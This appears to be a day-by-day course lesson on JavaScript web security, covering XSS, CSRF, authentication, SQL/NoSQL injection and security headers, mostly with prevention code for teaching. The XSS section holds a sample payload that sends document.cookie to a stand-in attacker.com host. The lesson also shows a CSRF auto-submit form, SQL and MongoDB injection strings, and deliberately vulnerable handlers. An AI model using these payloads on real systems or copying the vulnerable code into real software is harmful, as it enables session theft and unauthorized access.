# Day 26: JavaScript Security

## 🎯 Learning Objectives
- Understand common web vulnerabilities
- Learn XSS prevention
- Understand CSRF protection
- Master secure coding practices
- Know authentication patterns

---

## 🛡️ Cross-Site Scripting (XSS)

XSS allows attackers to inject malicious scripts into web pages.

### Types of XSS

```javascript
/*
1. STORED XSS
   - Malicious script stored on server
   - Affects all users who view the data
   - Example: Comment field storing <script>

2. REFLECTED XSS
   - Script in URL/request, reflected in response
   - Requires victim to click malicious link
   - Example: Search results showing query

3. DOM-BASED XSS
   - Vulnerability in client-side JavaScript
   - Manipulates DOM without server involvement
   - Example: document.write(location.hash)
*/

// ❌ Vulnerable: Stored XSS
app.post('/comment', (req, res) => {
    const comment = req.body.comment;
    db.save({ comment }); // Saved as-is
});

app.get('/comments', (req, res) => {
    const comments = db.getAll();
    res.send(`<div>${comments.map(c => c.comment).join('')}</div>`);
    // If comment contains <script>alert('XSS')</script>, it will execute
});

// ❌ Vulnerable: Reflected XSS
app.get('/search', (req, res) => {
    const query = req.query.q;
    res.send(`<h1>Results for: ${query}</h1>`);
    // URL: /search?q=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
});

// ❌ Vulnerable: DOM-based XSS
const hash = location.hash.substring(1);
document.getElementById('output').innerHTML = hash;
// URL: page.html#<img src=x onerror=alert('XSS')>
```

### XSS Prevention

```javascript
// 1. Escape HTML output
function escapeHtml(unsafe) {
    return unsafe
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
}

// ✅ Safe
const safeComment = escapeHtml(userInput);
element.innerHTML = safeComment;

// 2. Use textContent instead of innerHTML
element.textContent = userInput; // Automatically escaped

// 3. Use Content Security Policy (CSP)
// HTTP Header:
// Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com

// Or meta tag:
// <meta http-equiv="Content-Security-Policy" content="default-src 'self'">

// 4. Use DOMPurify for sanitization
import DOMPurify from 'dompurify';

const dirty = '<script>alert("XSS")</script><p>Hello</p>';
const clean = DOMPurify.sanitize(dirty);
// Result: <p>Hello</p>

// With allowed tags
const clean2 = DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: ['p', 'b', 'i', 'a'],
    ALLOWED_ATTR: ['href']
});

// 5. Avoid eval and similar
// ❌ Dangerous
eval(userInput);
new Function(userInput)();
setTimeout(userInput, 100);
setInterval(userInput, 100);

// ✅ Safe alternatives
JSON.parse(jsonString);
setTimeout(() => safeFunction(), 100);

// 6. Use HTTPOnly cookies
res.cookie('session', token, {
    httpOnly: true,  // Not accessible via JavaScript
    secure: true,    // HTTPS only
    sameSite: 'strict'
});

// 7. URL validation
function isValidUrl(string) {
    try {
        const url = new URL(string);
        return ['http:', 'https:'].includes(url.protocol);
    } catch {
        return false;
    }
}

// ❌ Vulnerable
const url = userInput;
window.location = url; // javascript:alert('XSS')

// ✅ Safe
if (isValidUrl(userInput) && !userInput.startsWith('javascript:')) {
    window.location = userInput;
}
```

---

## 🔄 Cross-Site Request Forgery (CSRF)

CSRF tricks users into performing unwanted actions.

```javascript
/*
ATTACK SCENARIO:
1. User is logged into bank.com
2. User visits malicious-site.com
3. Malicious site has:
   <form action="https://bank.com/transfer" method="POST">
     <input name="amount" value="10000">
     <input name="to" value="attacker">
   </form>
   <script>document.forms[0].submit();</script>
4. Browser sends request with user's cookies!
*/

// CSRF Prevention

// 1. CSRF Tokens
const csrf = require('csurf');
app.use(csrf({ cookie: true }));

app.get('/form', (req, res) => {
    res.render('form', { csrfToken: req.csrfToken() });
});

// In form:
// <input type="hidden" name="_csrf" value="<%= csrfToken %>">

// 2. SameSite Cookies
res.cookie('session', token, {
    sameSite: 'strict', // Won't be sent in cross-site requests
    // or 'lax' for GET requests only
    secure: true,
    httpOnly: true
});

// 3. Check Origin/Referer headers
function validateOrigin(req) {
    const origin = req.get('origin') || req.get('referer');
    const allowedOrigins = ['https://myapp.com'];
    return allowedOrigins.some(allowed => origin?.startsWith(allowed));
}

// 4. Custom headers (for AJAX)
// AJAX requests can set custom headers, forms cannot
fetch('/api/action', {
    method: 'POST',
    headers: {
        'X-Requested-With': 'XMLHttpRequest',
        'X-CSRF-Token': csrfToken
    }
});

// Server validates:
if (req.headers['x-requested-with'] !== 'XMLHttpRequest') {
    return res.status(403).send('Invalid request');
}

// 5. Double Submit Cookie
// Set CSRF token in both cookie and request
res.cookie('csrf', token, { sameSite: 'strict' });
// Client reads cookie and sends in header
// Server compares cookie and header values
```

---

## 🔐 Authentication Security

```javascript
// 1. Password Hashing
const bcrypt = require('bcrypt');

// Hash password
async function hashPassword(password) {
    const saltRounds = 12; // Cost factor
    return await bcrypt.hash(password, saltRounds);
}

// Verify password
async function verifyPassword(password, hash) {
    return await bcrypt.compare(password, hash);
}

// 2. JWT Security
const jwt = require('jsonwebtoken');

// Create token
const token = jwt.sign(
    { userId: user.id, role: user.role },
    process.env.JWT_SECRET,
    {
        expiresIn: '15m',        // Short expiration
        algorithm: 'HS256'       // Specify algorithm
    }
);

// Verify token (always specify algorithms!)
try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET, {
        algorithms: ['HS256']  // Prevent algorithm switching attacks
    });
} catch (err) {
    // Handle invalid token
}

// 3. Secure session management
const session = require('express-session');

app.use(session({
    secret: process.env.SESSION_SECRET,
    name: 'sessionId',          // Don't use default 'connect.sid'
    resave: false,
    saveUninitialized: false,
    cookie: {
        secure: true,           // HTTPS only
        httpOnly: true,         // No JS access
        maxAge: 15 * 60 * 1000, // 15 minutes
        sameSite: 'strict'
    }
}));

// 4. Rate limiting
const rateLimit = require('express-rate-limit');

const loginLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 5,                   // 5 attempts
    message: 'Too many login attempts, please try again later'
});

app.post('/login', loginLimiter, loginHandler);

// 5. Input validation
const { body, validationResult } = require('express-validator');

app.post('/register',
    body('email').isEmail().normalizeEmail(),
    body('password').isLength({ min: 8 })
        .matches(/[A-Z]/).withMessage('Must contain uppercase')
        .matches(/[a-z]/).withMessage('Must contain lowercase')
        .matches(/[0-9]/).withMessage('Must contain number'),
    (req, res) => {
        const errors = validationResult(req);
        if (!errors.isEmpty()) {
            return res.status(400).json({ errors: errors.array() });
        }
    }
);
```

---

## 💉 SQL/NoSQL Injection

```javascript
// ❌ Vulnerable to SQL Injection
const query = `SELECT * FROM users WHERE username = '${username}'`;
// Input: ' OR '1'='1' -- 
// Becomes: SELECT * FROM users WHERE username = '' OR '1'='1' --'

// ✅ Use parameterized queries
// MySQL
const mysql = require('mysql2/promise');
const [rows] = await connection.execute(
    'SELECT * FROM users WHERE username = ?',
    [username]
);

// PostgreSQL
const { Pool } = require('pg');
const result = await pool.query(
    'SELECT * FROM users WHERE username = $1',
    [username]
);

// ❌ Vulnerable to NoSQL Injection (MongoDB)
const user = await User.findOne({
    username: req.body.username,
    password: req.body.password
});
// Input: { "username": "admin", "password": { "$ne": "" } }
// Matches any non-empty password!

// ✅ Validate input types
if (typeof req.body.username !== 'string' || 
    typeof req.body.password !== 'string') {
    return res.status(400).send('Invalid input');
}

// Or use schema validation
const Joi = require('joi');

const schema = Joi.object({
    username: Joi.string().alphanum().min(3).max(30).required(),
    password: Joi.string().pattern(/^[a-zA-Z0-9]{8,30}$/).required()
});

const { error, value } = schema.validate(req.body);
```

---

## 🌐 Other Security Considerations

### Clickjacking Prevention

```javascript
// X-Frame-Options header
app.use((req, res, next) => {
    res.setHeader('X-Frame-Options', 'DENY');
    // or 'SAMEORIGIN' to allow same-origin frames
    next();
});

// Or use CSP frame-ancestors
res.setHeader('Content-Security-Policy', "frame-ancestors 'none'");
```

### Security Headers

```javascript
const helmet = require('helmet');

// Helmet sets many security headers
app.use(helmet());

// Or configure individually
app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            scriptSrc: ["'self'", "trusted.cdn.com"],
            styleSrc: ["'self'", "'unsafe-inline'"],
            imgSrc: ["'self'", "data:", "https:"],
            connectSrc: ["'self'", "api.example.com"]
        }
    },
    hsts: {
        maxAge: 31536000,
        includeSubDomains: true,
        preload: true
    }
}));

/*
HEADERS SET BY HELMET:
- Content-Security-Policy
- X-DNS-Prefetch-Control
- X-Frame-Options
- X-Powered-By (removed)
- Strict-Transport-Security
- X-Download-Options
- X-Content-Type-Options
- X-XSS-Protection
- Referrer-Policy
*/
```

### Secure Data Handling

```javascript
// 1. Never log sensitive data
console.log({ user: user.email, password: '***' }); // Don't log actual password

// 2. Use environment variables for secrets
const apiKey = process.env.API_KEY; // Not hardcoded

// 3. Encrypt sensitive data
const crypto = require('crypto');

function encrypt(text, key) {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
    let encrypted = cipher.update(text, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    const authTag = cipher.getAuthTag();
    return {
        iv: iv.toString('hex'),
        encrypted,
        authTag: authTag.toString('hex')
    };
}

function decrypt(data, key) {
    const decipher = crypto.createDecipheriv(
        'aes-256-gcm',
        key,
        Buffer.from(data.iv, 'hex')
    );
    decipher.setAuthTag(Buffer.from(data.authTag, 'hex'));
    let decrypted = decipher.update(data.encrypted, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    return decrypted;
}

// 4. Secure random values
crypto.randomBytes(32);           // Secure random bytes
crypto.randomUUID();              // Secure UUID
crypto.randomInt(0, 100);         // Secure random integer

// ❌ Don't use Math.random() for security
const badToken = Math.random().toString(36); // Predictable!
```

---

## 📋 Security Checklist

```javascript
/*
╔════════════════════════════════════════════════════════════════════╗
║                    SECURITY CHECKLIST                               ║
╠════════════════════════════════════════════════════════════════════╣
║                                                                     ║
║  INPUT VALIDATION:                                                  ║
║  □ Validate all user input                                          ║
║  □ Use parameterized queries                                        ║
║  □ Sanitize HTML output                                             ║
║  □ Validate file uploads (type, size)                               ║
║                                                                     ║
║  AUTHENTICATION:                                                    ║
║  □ Hash passwords with bcrypt                                       ║
║  □ Implement rate limiting                                          ║
║  □ Use secure session management                                    ║
║  □ Implement MFA where possible                                     ║
║                                                                     ║
║  COOKIES:                                                           ║
║  □ Set HttpOnly flag                                                ║
║  □ Set Secure flag                                                  ║
║  □ Set SameSite attribute                                           ║
║  □ Use appropriate expiration                                       ║
║                                                                     ║
║  HEADERS:                                                           ║
║  □ Implement CSP                                                    ║
║  □ Set X-Frame-Options                                              ║
║  □ Enable HSTS                                                      ║
║  □ Use Helmet middleware                                            ║
║                                                                     ║
║  DATA:                                                              ║
║  □ Encrypt sensitive data                                           ║
║  □ Use HTTPS everywhere                                             ║
║  □ Don't log sensitive info                                         ║
║  □ Use secure random generators                                     ║
║                                                                     ║
╚════════════════════════════════════════════════════════════════════╝
*/
```

---

## ✅ Day 26 Checklist

- [ ] Understand XSS types (stored, reflected, DOM)
- [ ] Implement XSS prevention (escaping, CSP)
- [ ] Understand CSRF attacks
- [ ] Implement CSRF protection
- [ ] Use secure password hashing
- [ ] Implement secure JWT handling
- [ ] Prevent SQL/NoSQL injection
- [ ] Set security headers
- [ ] Implement rate limiting
- [ ] Use helmet middleware
